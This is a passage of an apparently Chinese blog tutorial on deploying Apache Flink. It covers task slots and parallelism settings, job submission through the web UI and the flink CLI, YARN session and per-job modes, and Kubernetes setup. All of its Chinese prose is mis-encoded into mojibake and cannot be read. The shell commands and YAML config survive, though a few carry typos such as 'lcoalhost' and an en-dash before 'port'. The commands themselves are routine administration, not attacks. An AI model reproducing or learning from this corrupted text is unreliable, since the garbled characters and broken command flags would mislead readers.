hashcode,åŒä¸€ä¸ªkeyçš„hashå€¼å›ºå®šï¼Œåˆ†é…ç»™ç›¸å¯¹åº”çš„çº¿ç¨‹å¤„ç†ã€‚ </p></li></ol><h3 id="Flinkéƒ¨ç½²"><a href="#Flinkéƒ¨ç½²" class="headerlink" title="Flinkéƒ¨ç½²"></a>Flinkéƒ¨ç½²</h3><h4 id="Standaloneæ¨¡å¼"><a href="#Standaloneæ¨¡å¼" class="headerlink" title="Standaloneæ¨¡å¼"></a>Standaloneæ¨¡å¼</h4><blockquote><p><a href="https://blog.csdn.net/qq_39657909/article/details/105823127">Flinkä»»åŠ¡è°ƒåº¦åŸç†ä¹‹TaskManager ä¸Slots</a>    &lt;=    ä¸‹é¢å†…å®¹å‡ºè‡ªè¯¥åšæ–‡</p></blockquote><ol><li>Flink ä¸­æ¯ä¸€ä¸ª TaskManager éƒ½æ˜¯ä¸€ä¸ªJVMè¿›ç¨‹ï¼Œå®ƒå¯èƒ½ä¼šåœ¨ç‹¬ç«‹çš„çº¿ç¨‹ä¸Šæ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ª subtask</li><li>ä¸ºäº†æ§åˆ¶ä¸€ä¸ª TaskManager èƒ½æ¥æ”¶å¤šå°‘ä¸ª taskï¼Œ TaskManager é€šè¿‡ task slot æ¥è¿›è¡Œæ§åˆ¶ï¼ˆä¸€ä¸ª TaskManager è‡³å°‘æœ‰ä¸€ä¸ª slotï¼‰</li><li>æ¯ä¸ªtask slotè¡¨ç¤ºTaskManageræ‹¥æœ‰èµ„æºçš„ä¸€ä¸ªå›ºå®šå¤§å°çš„å­é›†ã€‚å‡å¦‚ä¸€ä¸ªTaskManageræœ‰ä¸‰ä¸ªslotï¼Œé‚£ä¹ˆå®ƒä¼šå°†å…¶ç®¡ç†çš„å†…å­˜åˆ†æˆä¸‰ä»½ç»™å„ä¸ªslot(æ³¨ï¼šè¿™é‡Œä¸ä¼šæ¶‰åŠCPUçš„éš”ç¦»ï¼Œslotä»…ä»…ç”¨æ¥éš”ç¦»taskçš„å—ç®¡ç†å†…å­˜)</li><li>å¯ä»¥é€šè¿‡è°ƒæ•´task slotçš„æ•°é‡å»è‡ªå®šä¹‰subtaskä¹‹é—´çš„éš”ç¦»æ–¹å¼ã€‚å¦‚ä¸€ä¸ªTaskManagerä¸€ä¸ªslotæ—¶ï¼Œé‚£ä¹ˆæ¯ä¸ªtask groupè¿è¡Œåœ¨ç‹¬ç«‹çš„JVMä¸­ã€‚è€Œ<strong>å½“ä¸€ä¸ªTaskManagerå¤šä¸ªslotæ—¶ï¼Œå¤šä¸ªsubtaskå¯ä»¥å…±åŒäº«æœ‰ä¸€ä¸ªJVM,è€Œåœ¨åŒä¸€ä¸ªJVMè¿›ç¨‹ä¸­çš„taskå°†å…±äº«TCPè¿æ¥å’Œå¿ƒè·³æ¶ˆæ¯ï¼Œä¹Ÿå¯èƒ½å…±äº«æ•°æ®é›†å’Œæ•°æ®ç»“æ„ï¼Œä»è€Œå‡å°‘æ¯ä¸ªtaskçš„è´Ÿè½½</strong>ã€‚</li></ol><p><img src="https://img-blog.csdnimg.cn/20200428203404161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjU3OTA5,size_16,color_FFFFFF,t_70###pic_center###id=rthw9&originHeight=229&originWidth=682&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/20200428205219327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjU3OTA5,size_16,color_FFFFFF,t_70###pic_center###id=sIIUo&originHeight=331&originWidth=724&originalType=binary&ratio=1&status=done&style=none"></p><ol><li>é»˜è®¤æƒ…å†µä¸‹ï¼ŒFlink å…è®¸å­ä»»åŠ¡å…±äº« slotï¼Œå³ä½¿å®ƒä»¬æ˜¯ä¸åŒä»»åŠ¡çš„å­ä»»åŠ¡ï¼ˆå‰ææ˜¯å®ƒä»¬æ¥è‡ªåŒä¸€ä¸ªjobï¼‰ã€‚ è¿™æ ·çš„ç»“æœæ˜¯ï¼Œä¸€ä¸ª slot å¯ä»¥ä¿å­˜ä½œä¸šçš„æ•´ä¸ªç®¡é“ã€‚</li><li>Task Slot æ˜¯é™æ€çš„æ¦‚å¿µï¼Œæ˜¯æŒ‡ TaskManager å…·æœ‰çš„å¹¶å‘æ‰§è¡Œèƒ½åŠ›ï¼Œå¯ä»¥é€šè¿‡å‚æ•°taskmanager.numberOfTaskSlotsè¿›è¡Œé…ç½®ï¼›è€Œå¹¶è¡Œåº¦parallelismæ˜¯åŠ¨æ€æ¦‚å¿µï¼Œå³TaskManagerè¿è¡Œç¨‹åºæ—¶å®é™…ä½¿ç”¨çš„å¹¶å‘èƒ½åŠ›ï¼Œå¯ä»¥é€šè¿‡å‚æ•°parallelism.defaultè¿›è¡Œé…ç½®ã€‚<br>ä¸¾ä¾‹ï¼šå¦‚æœæ€»å…±æœ‰3ä¸ªTaskManager,æ¯ä¸€ä¸ªTaskManagerä¸­åˆ†é…äº†3ä¸ªTaskSlot,ä¹Ÿå°±æ˜¯æ¯ä¸ªTaskManagerå¯ä»¥æ¥æ”¶3ä¸ªtask,è¿™æ ·æˆ‘ä»¬æ€»å…±å¯ä»¥æ¥æ”¶9ä¸ªTaskSotã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬è®¾ç½®parallelism.default=1ï¼Œé‚£ä¹ˆå½“ç¨‹åºè¿è¡Œæ—¶9ä¸ªTaskSlotå°†åªæœ‰1ä¸ªè¿è¡Œï¼Œ8ä¸ªéƒ½ä¼šå¤„äºç©ºé—²çŠ¶æ€ï¼Œæ‰€ä»¥è¦å­¦ä¼šåˆç†è®¾ç½®å¹¶è¡Œåº¦ï¼å…·ä½“å›¾è§£å¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20200902165040619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NjU3OTA5,size_16,color_FFFFFF,t_70###pic_center###id=s1OUN&originHeight=1022&originWidth=658&originalType=binary&ratio=1&status=done&style=none"></li></ol><p><code>conf/flink-conf.yaml</code>é…ç½®æ–‡ä»¶ä¸­</p><ul><li><code>taskmanager.numberOfTaskSlots</code></li><li><code>parallelism.default</code></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### The number of task slots that each TaskManager offers. Each slot runs one parallel pipeline.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">taskmanager.numberOfTaskSlots:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### The parallelism used for programs that did not specify and other parallelism.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">parallelism.default:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æ³¨ï¼š<strong>Flinkå­˜å‚¨Stateç”¨çš„æ˜¯å †å¤–å†…å­˜</strong>ï¼Œæ‰€ä»¥web UIé‡Œ<code>JVM Heap Size</code>å’Œ<code>Flink Managed MEM</code>æ˜¯ä¸¤ä¸ªåˆ†å¼€çš„å€¼ã€‚</p><h5 id="Web-UIæäº¤job"><a href="#Web-UIæäº¤job" class="headerlink" title="Web UIæäº¤job"></a>Web UIæäº¤job</h5><blockquote><p><a href="https://blog.csdn.net/qq_37142346/article/details/91385333">Flink Savepointç®€å•ä»‹ç»</a></p></blockquote><p>å¯åŠ¨Flinkåï¼Œå¯ä»¥åœ¨Web UIçš„<code>Submit New Job</code>æäº¤jaråŒ…ï¼Œç„¶åæŒ‡å®šJobå‚æ•°ã€‚</p><ul><li> Entry Class<br>ç¨‹åºçš„å…¥å£ï¼ŒæŒ‡å®šå…¥å£ç±»ï¼ˆç±»çš„å…¨é™åˆ¶åï¼‰ </li><li> Program Arguments<br>ç¨‹åºå¯åŠ¨å‚æ•°ï¼Œä¾‹å¦‚<code>--host localhost --port 7777</code> </li><li>Parallelism<br>è®¾ç½®Jobå¹¶è¡Œåº¦ã€‚<br>Psï¼šå¹¶è¡Œåº¦ä¼˜å…ˆçº§ï¼ˆä»ä¸Šåˆ°ä¸‹ä¼˜å…ˆçº§é€’å‡ï¼‰ <ul><li>ä»£ç ä¸­ç®—å­<code>setParallelism()</code></li><li><code>ExecutionEnvironment env.setMaxParallelism()</code></li><li>è®¾ç½®çš„Jobå¹¶è¡Œåº¦</li><li>é›†ç¾¤confé…ç½®æ–‡ä»¶ä¸­çš„<code>parallelism.default</code></li></ul></li></ul><p>psï¼š<strong>socketç­‰ç‰¹æ®Šçš„IOæ“ä½œï¼Œæœ¬èº«ä¸èƒ½å¹¶è¡Œå¤„ç†ï¼Œå¹¶è¡Œåº¦åªèƒ½æ˜¯1</strong></p><ul><li> Savepoint Path<br>savepointæ˜¯é€šè¿‡checkpointæœºåˆ¶ä¸ºstreaming jobåˆ›å»ºçš„ä¸€è‡´æ€§å¿«ç…§ï¼Œæ¯”å¦‚æ•°æ®æºoffsetï¼ŒçŠ¶æ€ç­‰ã€‚<br>(savepointå¯ä»¥ç†è§£ä¸ºæ‰‹åŠ¨å¤‡ä»½ï¼Œè€Œcheckpointä¸ºè‡ªåŠ¨å¤‡ä»½) </li></ul><p>psï¼šæäº¤jobè¦æ³¨æ„åˆ†é…çš„slotæ€»æ•°æ˜¯å¦è¶³å¤Ÿä½¿ç”¨ï¼Œå¦‚æœslotæ€»æ•°ä¸å¤Ÿï¼Œé‚£ä¹ˆjobæ‰§è¡Œå¤±è´¥ã€‚ï¼ˆèµ„æºä¸å¤Ÿè°ƒåº¦ï¼‰</p><p>è¿™é‡Œæäº¤å‰é¢demoé¡¹ç›®çš„StreamWordCountï¼Œåœ¨æœ¬åœ°socketå³<code>nc -lk 7777</code>ä¸­è¾“å…¥å­—ç¬¦ä¸²ï¼ŒæŸ¥çœ‹ç»“æœ</p><p>è¾“å…¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world, and thank you!</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p>å¯ä»¥çœ‹å‡ºæ¥è¾“å‡ºçš„é¡ºåºå¹¶ä¸æ˜¯å’Œè¾“å…¥çš„å­—ç¬¦ä¸²ä¸¥æ ¼ç›¸åŒçš„ï¼Œå› ä¸ºæ˜¯å¤šä¸ªçº¿ç¨‹å¹¶è¡Œå¤„ç†çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">1&gt;</span><span class="bash"> (world,,1)</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (and,1)</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (thank,1)</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (you!,1)</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (hello,1)</span></span><br></pre></td></tr></table></figure><h5 id="å‘½ä»¤è¡Œæäº¤job"><a href="#å‘½ä»¤è¡Œæäº¤job" class="headerlink" title="å‘½ä»¤è¡Œæäº¤job"></a>å‘½ä»¤è¡Œæäº¤job</h5><ol><li><p> æŸ¥çœ‹å·²æäº¤çš„æ‰€æœ‰job  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/flink list</span>      </span><br><span class="line">Waiting for response...</span><br><span class="line">------------------ Running/Restarting Jobs -------------------</span><br><span class="line">30.01.2021 17:09:45 : 30d9dda946a170484d55e41358973942 : Flink Streaming Job (RUNNING)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">No scheduled jobs.</span><br></pre></td></tr></table></figure></li><li><p> æäº¤job </p></li></ol><ul><li><code>-c</code>æŒ‡å®šå…¥å£ç±»</li><li><code>-p</code>æŒ‡å®šjobçš„å¹¶è¡Œåº¦</li></ul><p><code>bin/flink run -c &lt;å…¥å£ç±»&gt; -p &lt;å¹¶è¡Œåº¦&gt; &lt;jaråŒ…è·¯å¾„&gt; &lt;å¯åŠ¨å‚æ•°&gt;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/flink run -c wc.StreamWordCount -p 3 /tmp/Flink_Tutorial-1.0-SNAPSHOT.jar --host localhost --port 7777</span></span><br><span class="line">Job has been submitted with JobID 33a5d1f00688a362837830f0b85fd75e</span><br></pre></td></tr></table></figure><ol start="3"><li> å–æ¶ˆjob<br><code>bin/flink cancel &lt;Jobçš„ID&gt;</code>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/flink cancel 30d9dda946a170484d55e41358973942</span></span><br><span class="line">Cancelling job 30d9dda946a170484d55e41358973942.</span><br><span class="line">Cancelled job 30d9dda946a170484d55e41358973942.</span><br></pre></td></tr></table></figure></li></ol><p><strong>æ³¨ï¼šTotal Task Slotsåªè¦ä¸å°äºJobä¸­Parallelismæœ€å¤§å€¼å³å¯ã€‚</strong></p><p>egï¼šè¿™é‡Œæˆ‘é…ç½®æ–‡ä»¶è®¾ç½®<code>taskmanager.numberOfTaskSlots: 4</code>ï¼Œå®é™…Jobè¿è¡Œæ—¶æ€»Tasksæ˜¾ç¤º9ï¼Œä½†æ˜¯é‡Œé¢å…·ä½“4ä¸ªä»»åŠ¡æ­¥éª¤åˆ†åˆ«éœ€æ±‚ï¼ˆ1ï¼Œ3ï¼Œ3ï¼Œ2ï¼‰æ•°é‡çš„Tasksï¼Œ4&gt;3ï¼Œæ»¡è¶³æœ€å¤§çš„Parallelismå³å¯è¿è¡ŒæˆåŠŸã€‚</p><h4 id="yarnæ¨¡å¼"><a href="#yarnæ¨¡å¼" class="headerlink" title="yarnæ¨¡å¼"></a>yarnæ¨¡å¼</h4><blockquote><p><a href="https://blog.csdn.net/suyebiubiu/article/details/111874245">4.6 Flink-æµå¤„ç†æ¡†æ¶-Flink On Yarnï¼ˆSession-cluster+Per-Job-Clusterï¼‰</a>    &lt;=    ä¸‹é¢å†…å®¹å‡ºè‡ªæ­¤å¤„ï¼Œä¸»è¦æ–¹ä¾¿ç´¢å¼•å›¾ç‰‡URL</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»¥Yarnæ¨¡å¼éƒ¨ç½²Flinkä»»åŠ¡æ—¶ï¼Œè¦æ±‚Flinkæ˜¯æœ‰ Hadoop æ”¯æŒçš„ç‰ˆæœ¬ï¼ŒHadoop ç¯å¢ƒéœ€è¦ä¿è¯ç‰ˆæœ¬åœ¨ 2.2 ä»¥ä¸Šï¼Œå¹¶ä¸”é›†ç¾¤ä¸­å®‰è£…æœ‰ HDFS æœåŠ¡ã€‚</span><br></pre></td></tr></table></figure><h5 id="Flink-on-Yarn"><a href="#Flink-on-Yarn" class="headerlink" title="Flink on Yarn"></a>Flink on Yarn</h5><pre><code>Flinkæä¾›äº†ä¸¤ç§åœ¨yarnä¸Šè¿è¡Œçš„æ¨¡å¼ï¼Œåˆ†åˆ«ä¸ºSession-Clusterå’ŒPer-Job-Clusteræ¨¡å¼ã€‚</code></pre><h6 id="Sesstion-Clusteræ¨¡å¼"><a href="#Sesstion-Clusteræ¨¡å¼" class="headerlink" title="Sesstion Clusteræ¨¡å¼"></a>Sesstion Clusteræ¨¡å¼</h6><pre><code>Session-Cluster æ¨¡å¼éœ€è¦å…ˆå¯åŠ¨é›†ç¾¤ï¼Œç„¶åå†æäº¤ä½œä¸šï¼Œæ¥ç€ä¼šå‘ yarn ç”³è¯·ä¸€å—ç©ºé—´åï¼Œ**èµ„æºæ°¸è¿œä¿æŒä¸å˜**ã€‚å¦‚æœèµ„æºæ»¡äº†ï¼Œä¸‹ä¸€ä¸ªä½œä¸šå°±æ— æ³•æäº¤ï¼Œåªèƒ½ç­‰åˆ° yarn ä¸­çš„å…¶ä¸­ä¸€ä¸ªä½œä¸šæ‰§è¡Œå®Œæˆåï¼Œé‡Šæ”¾äº†èµ„æºï¼Œä¸‹ä¸ªä½œä¸šæ‰ä¼šæ­£å¸¸æäº¤ã€‚**æ‰€æœ‰ä½œä¸šå…±äº« Dispatcher å’Œ ResourceManager**ï¼›**å…±äº«èµ„æºï¼›é€‚åˆè§„æ¨¡å°æ‰§è¡Œæ—¶é—´çŸ­çš„ä½œä¸šã€‚**</code></pre><p><img src="https://img-blog.csdnimg.cn/20201228202616146.png###id=MBDhI&originHeight=183&originWidth=558&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>**åœ¨ yarn ä¸­åˆå§‹åŒ–ä¸€ä¸ª flink é›†ç¾¤ï¼Œå¼€è¾ŸæŒ‡å®šçš„èµ„æºï¼Œä»¥åæäº¤ä»»åŠ¡éƒ½å‘è¿™é‡Œæäº¤ã€‚è¿™ä¸ª flink é›†ç¾¤ä¼šå¸¸é©»åœ¨ yarn é›†ç¾¤ä¸­ï¼Œé™¤éæ‰‹å·¥åœæ­¢ã€‚**</code></pre><h6 id="Per-Job-Cluster-æ¨¡å¼"><a href="#Per-Job-Cluster-æ¨¡å¼" class="headerlink" title="Per Job Cluster æ¨¡å¼"></a>Per Job Cluster æ¨¡å¼</h6><pre><code>ä¸€ä¸ª Job ä¼šå¯¹åº”ä¸€ä¸ªé›†ç¾¤ï¼Œæ¯æäº¤ä¸€ä¸ªä½œä¸šä¼šæ ¹æ®è‡ªèº«çš„æƒ…å†µï¼Œéƒ½ä¼šå•ç‹¬å‘ yarn ç”³è¯·èµ„æºï¼Œç›´åˆ°ä½œä¸šæ‰§è¡Œå®Œæˆï¼Œä¸€ä¸ªä½œä¸šçš„å¤±è´¥ä¸å¦å¹¶ä¸ä¼šå½±å“ä¸‹ä¸€ä¸ªä½œä¸šçš„æ­£å¸¸æäº¤å’Œè¿è¡Œã€‚**ç‹¬äº« Dispatcher å’Œ ResourceManager**ï¼ŒæŒ‰éœ€æ¥å—èµ„æºç”³è¯·ï¼›é€‚åˆè§„æ¨¡å¤§é•¿æ—¶é—´è¿è¡Œçš„ä½œä¸šã€‚**æ¯æ¬¡æäº¤éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ flink é›†ç¾¤ï¼Œä»»åŠ¡ä¹‹é—´äº’ç›¸ç‹¬ç«‹ï¼Œäº’ä¸å½±å“ï¼Œæ–¹ä¾¿ç®¡ç†ã€‚ä»»åŠ¡æ‰§è¡Œå®Œæˆä¹‹ååˆ›å»ºçš„é›†ç¾¤ä¹Ÿä¼šæ¶ˆå¤±ã€‚**</code></pre><p><img src="https://img-blog.csdnimg.cn/20201228202718916.png###id=fMgvZ&originHeight=146&originWidth=548&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="Session-Cluster"><a href="#Session-Cluster" class="headerlink" title="Session Cluster"></a>Session Cluster</h5><ol><li> å¯åŠ¨_hadoop_é›†ç¾¤ï¼ˆç•¥ï¼‰ </li><li> å¯åŠ¨_yarn-session_<br>å…¶ä¸­ï¼š <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./yarn-session.sh -n 2 -s 2 -jm 1024 -tm 1024 -nm test -d</span><br></pre></td></tr></table></figure></li></ol><ul><li> <code>-n(--container)</code>ï¼šTaskManagerçš„æ•°é‡ã€‚ </li><li> <code>-s(--slots)</code>ï¼šæ¯ä¸ªTaskManagerçš„slotæ•°é‡ï¼Œé»˜è®¤ä¸€ä¸ªslotä¸€ä¸ªcoreï¼Œé»˜è®¤æ¯ä¸ªtaskmanagerçš„slotçš„ä¸ªæ•°ä¸º1ï¼Œæœ‰æ—¶å¯ä»¥å¤šä¸€äº›taskmanagerï¼Œåšå†—ä½™ã€‚ </li><li> <code>-jm</code>ï¼šJobManagerçš„å†…å­˜ï¼ˆå•ä½MB)ã€‚ </li><li> <code>-tm</code>ï¼šæ¯ä¸ªtaskmanagerçš„å†…å­˜ï¼ˆå•ä½MB)ã€‚ </li><li> <code>-nm</code>ï¼šyarn çš„appName(ç°åœ¨yarnçš„uiä¸Šçš„åå­—)ã€‚ </li><li> <code>-d</code>ï¼šåå°æ‰§è¡Œã€‚ </li></ul><ol start="3"><li><p> æ‰§è¡Œä»»åŠ¡  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flink run -c com.atguigu.wc.StreamWordCount FlinkTutorial-1.0-SNAPSHOT-jar-with-dependencies.jar --host lcoalhost â€“port 7777</span><br></pre></td></tr></table></figure></li><li><p> å» yarn æ§åˆ¶å°æŸ¥çœ‹ä»»åŠ¡çŠ¶æ€<br><img src="https://img-blog.csdnimg.cn/20201228202911116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1N1eWViaXViaXU=,size_16,color_FFFFFF,t_70###id=dNjdi&originHeight=260&originWidth=685&originalType=binary&ratio=1&status=done&style=none"> </p></li><li><p> å–æ¶ˆ yarn-session  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn application --kill application_1577588252906_0001</span><br></pre></td></tr></table></figure></li></ol><h5 id="Per-Job-Cluster"><a href="#Per-Job-Cluster" class="headerlink" title="Per Job Cluster"></a>Per Job Cluster</h5><ol><li> å¯åŠ¨_hadoop_é›†ç¾¤ï¼ˆç•¥ï¼‰ </li><li> ä¸å¯åŠ¨<strong>yarn-session</strong>ï¼Œç›´æ¥æ‰§è¡Œ_job_  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flink run â€“m yarn-cluster -c com.atguigu.wc.StreamWordCount FlinkTutorial-1.0-SNAPSHOT-jar-with-dependencies.jar --host lcoalhost â€“port 7777</span><br></pre></td></tr></table></figure></li></ol><h4 id="Kuberneteséƒ¨ç½²"><a href="#Kuberneteséƒ¨ç½²" class="headerlink" title="Kuberneteséƒ¨ç½²"></a>Kuberneteséƒ¨ç½²</h4><pre><code>å®¹å™¨åŒ–éƒ¨ç½²æ—¶ç›®å‰ä¸šç•Œå¾ˆæµè¡Œçš„ä¸€é¡¹æŠ€æœ¯ï¼ŒåŸºäºDockeré•œåƒè¿è¡Œèƒ½å¤Ÿè®©ç”¨æˆ·æ›´åŠ æ–¹ä¾¿åœ°å¯¹åº”ç”¨è¿›è¡Œç®¡ç†å’Œè¿ç»´ã€‚å®¹å™¨ç®¡ç†å·¥å…·ä¸­æœ€ä¸ºæµè¡Œçš„å°±æ˜¯Kubernetesï¼ˆk8sï¼‰ï¼Œè€ŒFlinkä¹Ÿåœ¨æœ€è¿‘çš„ç‰ˆæœ¬ä¸­æ”¯æŒäº†k8séƒ¨ç½²æ¨¡å¼ã€‚</code></pre><ol><li> æ­å»º_Kubernetes_é›†ç¾¤ï¼ˆç•¥ï¼‰ </li><li> é…ç½®å„ç»„ä»¶çš„_yaml_æ–‡ä»¶ </li></ol><pre><code>åœ¨k8sä¸Šæ„å»ºFlink Session Clusterï¼Œéœ€è¦å°†Flinké›†ç¾¤çš„ç»„ä»¶å¯¹åº”çš„dockeré•œåƒåˆ†åˆ«åœ¨k8sä¸Šå¯åŠ¨ï¼ŒåŒ…æ‹¬JobManagerã€TaskManagerã€JobManagerServiceä¸‰ä¸ªé•œåƒæœåŠ¡ã€‚æ¯ä¸ªé•œåƒæœåŠ¡éƒ½å¯ä»¥ä»ä¸­å¤®é•œåƒä»“åº“ä¸­è·å–ã€‚</code></pre><ol start="3"><li><p> å¯åŠ¨_Flink Session Cluster_  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// å¯åŠ¨jobmanager-service æœåŠ¡</span><br><span class="line">kubectl create -f jobmanager-service.yaml</span><br><span class="line">// å¯åŠ¨jobmanager-deploymentæœåŠ¡</span><br><span class="line">kubectl create -f jobmanager-deployment.yaml</span><br><span class="line">// å¯åŠ¨taskmanager-deploymentæœåŠ¡</span><br><span class="line">kubectl create -f taskmanager-deployment.yaml</span><br></pre></td></tr></table></figure></li><li><p> è®¿é—®_Flink UI_é¡µé¢<br>é›†ç¾¤å¯åŠ¨åï¼Œå°±å¯ä»¥é€šè¿‡JobManagerServicersä¸­é…ç½®çš„WebUIç«¯å£ï¼Œç”¨æµè§ˆå™¨è¾“å…¥ä»¥ä¸‹urlæ¥è®¿é—®Flink UIé¡µé¢äº†ï¼š<br><code>http://&#123;JobManagerHost:Port&#125;/api/v1/namespaces/default/services/flink-jobmanager:ui/proxy</code> </p></li></ol><h3 id="Flinkè¿è¡Œæ¶æ„"><a href="#Flinkè¿è¡Œæ¶æ„" class="headerlink" title="Flinkè¿è¡Œæ¶æ„"></a>Flinkè¿è¡Œæ¶æ„</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106321149">Flink-è¿è¡Œæ—¶æ¶æ„ä¸­çš„å››å¤§ç»„ä»¶|ä»»åŠ¡æäº¤æµç¨‹|ä»»åŠ¡è°ƒåº¦åŸç†|Slotså’Œå¹¶è¡Œåº¦ä¸­é—´çš„å…³ç³»|æ•°æ®æµ|æ‰§è¡Œå›¾|æ•°æ®å¾—ä¼ è¾“å½¢å¼|ä»»åŠ¡é“¾</a></p></blockquote><h4 id="Flinkè¿è¡Œæ—¶çš„ç»„ä»¶"><a href="#Flinkè¿è¡Œæ—¶çš„ç»„ä»¶" class="headerlink" title="Flinkè¿è¡Œæ—¶çš„ç»„ä»¶"></a>Flinkè¿è¡Œæ—¶çš„ç»„ä»¶</h4><pre><code>Flinkè¿è¡Œæ—¶æ¶æ„ä¸»è¦åŒ…æ‹¬å››ä¸ªä¸åŒçš„ç»„ä»¶ï¼Œå®ƒä»¬ä¼šåœ¨è¿è¡Œæµå¤„ç†åº”ç”¨ç¨‹åºæ—¶ååŒå·¥ä½œï¼š</code></pre><ul><li><strong>ä½œä¸šç®¡ç†å™¨ï¼ˆJobManagerï¼‰</strong></li><li><strong>èµ„æºç®¡ç†å™¨ï¼ˆResourceManagerï¼‰</strong></li><li><strong>ä»»åŠ¡ç®¡ç†å™¨ï¼ˆTaskManagerï¼‰</strong></li><li><strong>åˆ†å‘å™¨ï¼ˆDispatcherï¼‰</strong></li></ul><pre><code>å› ä¸ºFlinkæ˜¯ç”¨Javaå’ŒScalaå®ç°çš„ï¼Œæ‰€ä»¥æ‰€æœ‰ç»„ä»¶éƒ½ä¼šè¿è¡Œåœ¨Javaè™šæ‹Ÿæœºä¸Šã€‚æ¯ä¸ªç»„ä»¶çš„èŒè´£å¦‚ä¸‹ï¼š</code></pre><h5 id="ä½œä¸šç®¡ç†å™¨ï¼ˆJobManagerï¼‰"><a href="#ä½œä¸šç®¡ç†å™¨ï¼ˆJobManagerï¼‰" class="headerlink" title="ä½œä¸šç®¡ç†å™¨ï¼ˆJobManagerï¼‰"></a>ä½œä¸šç®¡ç†å™¨ï¼ˆJobManagerï¼‰</h5><pre><code>æ§åˆ¶ä¸€ä¸ªåº”ç”¨ç¨‹åºæ‰§è¡Œçš„ä¸»è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªåº”ç”¨ç¨‹åºéƒ½ä¼šè¢«ä¸€ä¸ªä¸åŒçš„JobManageræ‰€æ§åˆ¶æ‰§è¡Œã€‚JobManagerä¼šå…ˆæ¥æ”¶åˆ°è¦æ‰§è¡Œçš„åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªåº”ç”¨ç¨‹åºä¼šåŒ…æ‹¬ï¼š</code></pre><ul><li>ä½œä¸šå›¾ï¼ˆJobGraphï¼‰</li><li>é€»è¾‘æ•°æ®æµå›¾ï¼ˆlogical dataflow 